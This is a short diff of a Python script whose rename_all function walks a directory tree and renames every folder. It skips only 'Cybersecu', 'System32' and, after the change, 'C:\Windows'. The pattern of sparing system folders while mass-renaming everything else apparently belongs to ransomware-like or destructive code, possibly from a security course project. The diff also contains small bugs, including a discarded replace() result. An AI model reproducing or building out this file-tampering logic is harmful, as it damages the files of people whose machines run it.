@@ -22,12 +22,13 @@ def change_name(old_filename, p):
 
 
 def rename_all(p):
-    exclude = ["Cybersecu", "Windows", "System32"]
+    exclude = ["Cybersecu", "System32"]
     for i in os.listdir(p):
+        file_name = "%s%s" % (p, i)
         if i not in exclude:
-            file_name = "%s%s" % (p, i)
             if os.path.isdir(file_name):
-                file_name = change_name(file_name, p)
+                if file_name != "C:\Windows":
+                    file_name = change_name(file_name, p)
                 file_name = "%s/" % (file_name)
                 if isWindows():
                     file_name.replace('/', '\\')
